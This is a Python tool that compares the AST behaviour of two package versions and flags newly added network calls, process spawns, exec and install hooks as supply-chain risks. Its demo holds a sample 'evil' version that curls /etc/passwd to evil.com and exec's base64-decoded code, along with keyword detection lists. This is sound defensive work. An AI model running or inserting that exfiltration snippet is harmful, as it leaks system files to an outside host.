#!/usr/bin/env python3
# Task: Behavioral diff analyzer | Mission: OSS Supply Chain Compromise Monitor
"""
Compares behavioral signatures between package versions using AST analysis.
Detects newly added network calls, process spawns, eval/exec, and obfuscation.

Install: pip install (stdlib only)
Usage:   python behavioral-diff-analyzer.py [old_version.py] [new_version.py]
"""
import ast, re, json, sys
from dataclasses import dataclass, field
from typing import List, Dict, Any

@dataclass
class BehaviorSig:
    version: str
    network_calls: List[str] = field(default_factory=list)
    process_spawns: List[str] = field(default_factory=list)
    eval_usage: List[str] = field(default_factory=list)
    encoded_strings: List[str] = field(default_factory=list)
    install_hooks: List[str] = field(default_factory=list)
    imports: List[str] = field(default_factory=list)

class Extractor(ast.NodeVisitor):
    def __init__(self, version:str):
        self.sig = BehaviorSig(version=version)
    def visit_Call(self, node):
        fn = ""
        if isinstance(node.func,ast.Attribute): fn=f"{ast.dump(node.func.value)}.{node.func.attr}"
        elif isinstance(node.func,ast.Name): fn=node.func.id
        if any(n in fn for n in ["urlopen","requests","socket","http","aiohttp"]): self.sig.network_calls.append(fn)
        if any(n in fn for n in ["subprocess","popen","system"]): self.sig.process_spawns.append(fn)
        if fn in ("eval","exec","__import__"): self.sig.eval_usage.append(fn)
        self.generic_visit(node)
    def visit_Import(self, node):
        for a in node.names: self.sig.imports.append(a.name)
    def visit_ImportFrom(self, node):
        if node.module: self.sig.imports.append(node.module)

def extract(source:str, version:str) -> BehaviorSig:
    try:
        tree=ast.parse(source); ex=Extractor(version); ex.visit(tree)
        for m in re.compile(r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']').finditer(source):
            ex.sig.encoded_strings.append(m.group(1)[:50]+"...")
        if re.search(r"(cmdclass|entry_points|console_scripts)",source):
            ex.sig.install_hooks.append("setup.py hooks detected")
        return ex.sig
    except SyntaxError as e:
        sig=BehaviorSig(version=version); sig.eval_usage.append(f"PARSE_ERROR:{e}"); return sig

def diff(old:BehaviorSig, new:BehaviorSig) -> Dict[str,Any]:
    def added(o,n): return [x for x in n if x not in set(o)]
    d={
        "version_from":old.version,"version_to":new.version,
        "new_network_calls":added(old.network_calls,new.network_calls),
        "new_process_spawns":added(old.process_spawns,new.process_spawns),
        "new_eval_usage":added(old.eval_usage,new.eval_usage),
        "new_encoded_strings":added(old.encoded_strings,new.encoded_strings),
        "new_install_hooks":added(old.install_hooks,new.install_hooks),
        "new_imports":added(old.imports,new.imports),
    }
    risk=0.0; reasons=[]
    if d["new_network_calls"]: risk+=0.4; reasons.append(f"Added {len(d['new_network_calls'])} network call(s)")
    if d["new_process_spawns"]: risk+=0.5; reasons.append("Added process spawn(s)")
    if d["new_eval_usage"]: risk+=0.8; reasons.append("Added eval/exec usage")
    if d["new_encoded_strings"]: risk+=0.6; reasons.append("Added base64 string(s)")
    if d["new_install_hooks"]: risk+=0.7; reasons.append("Added install hooks")
    d["risk_score"]=min(risk,1.0); d["risk_reasons"]=reasons
    d["risk_level"]="CRITICAL" if risk>=0.8 else "HIGH" if risk>=0.5 else "MEDIUM" if risk>=0.3 else "LOW"
    return d

if __name__=="__main__":
    clean='import requests\ndef get(url): return requests.get(url).json()\n'
    evil='import requests,subprocess,base64\ndef get(url):\n    subprocess.run(["curl","-d",open("/etc/passwd").read(),"https://evil.com"])\n    exec(base64.b64decode("aW1wb3J0IG9z"))\n    return requests.get(url).json()\n'
    print("=== Behavioral Diff ===")
    print(json.dumps(diff(extract(clean,"1.0.0"),extract(evil,"1.0.1")),indent=2))
